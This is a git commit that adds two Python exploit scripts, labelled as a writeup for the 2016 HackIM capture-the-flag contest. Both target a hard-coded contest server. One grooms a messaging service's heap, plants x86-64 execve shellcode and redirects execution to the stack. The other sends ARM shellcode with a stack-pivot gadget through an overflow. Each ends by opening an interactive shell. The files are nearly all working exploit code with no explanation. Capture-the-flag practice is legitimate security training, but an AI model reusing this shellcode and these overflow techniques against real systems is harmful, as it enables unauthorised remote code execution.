4b10f066cafb8f165873d7abb6932f5cc604123f
angelboy <scwuaptx@gmail.com>
2016-02-01 02:50:22 +0800

    add writeup for hackim

---
+++ 2016-writeup/HackIM/hotmail.py
@@ -0,0 +1,72 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwnpwnpwn import *
+import re
+
+
+host = "52.72.171.221"
+port = 9984
+
+sock = make_conn(host,port)
+
+def adduser(sock,name):
+    recvuntil(sock,"$:")
+    sendline(sock,"1")
+    recvuntil(sock,":")
+    sendline(sock,name)
+
+def login(sock,name):
+    recvuntil(sock,"$:")
+    sendline(sock,"2")
+    recvuntil(sock,":")
+    sendline(sock,name)
+
+def sendmsg(sock,name,msg):
+    recvuntil(sock,"$:")
+    sendline(sock,"1")
+    recvuntil(sock,"To:")
+    sendline(sock,name)
+    recvuntil(sock,"Message:")
+    sendline(sock,msg)
+
+def logout(sock):
+    recvuntil(sock,"$:")
+    sendline(sock,"5")
+
+
+adduser(sock,"orange")
+adduser(sock,"ddaa")
+login(sock,"ddaa")
+
+#put the shellcode
+for i in range(4):
+    sendmsg(sock,"orange","p"*30)
+logout(sock)
+login(sock,"orange")
+logout(sock)
+login(sock,"ddaa")
+
+shellcode = "\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+sendmsg(sock,"orange",shellcode)
+
+loc = 113+9
+last = 365+9
+
+
+for i in range(loc-4):
+    print i
+    sendmsg(sock,"orange","d"*30)
+sendmsg(sock,"orange","d"*1)
+sendmsg(sock,"orange","d"*1)
+sendmsg(sock,"orange","d"*17)
+sendmsg(sock,"orange","adddd" + "pppppppp")
+#overwrite the outputbuf
+sendmsg(sock,"orange","aaaaaaaabbbbbb" + pack(0x7fffffffba88-0x2b-0xc10-(0x70*9)))  # the last byte of rbp will be overwrited with \x00 and ret to stack
+for i in range(last-loc-2):
+    print i
+    sendmsg(sock,"orange","b"*30)
+
+
+logout(sock)
+inter(sock)
+
---
+++ 2016-writeup/HackIM/pinkfloyd.py
@@ -0,0 +1,31 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwnpwnpwn import *
+import re
+
+#host = "192.168.1.30"
+host = "52.72.171.221"
+port = 9981
+
+
+gadget = 0x8d9c # sub sp, r11, #4 ; pop{r11, pc}    
+sp = 0x8c0cc
+
+sock = make_conn(host,port)
+
+recvuntil(sock,"$>")
+sendline(sock,"create")
+recvuntil(sock,"name:")
+shellcode = "42808fe2d640a0e320608fe2010c54e316ff2f81d64044e20450d8e7025025e20450c8e7d74084e2f7ffffeaf4ffffeb01608fe216ff2fe16d1b0135b61b60b460b468466946a22701df01233d25901806272a1e033b03dd9340f8d37a4408320220092507b66b4403dd2d606b6c2d716a0202020000c046".decode('hex')
+payload = shellcode.ljust(212,"a")
+payload += pack32(0x41414141)
+payload += pack32(gadget)
+    
+    
+    
+sendline(sock,payload)
+recvuntil(sock,":")
+sendline(sock,"b"*84 + pack32(sp))
+recvuntil(sock,":")
+sendline(sock,shellcode.ljust(100,"a"))
+inter(sock)
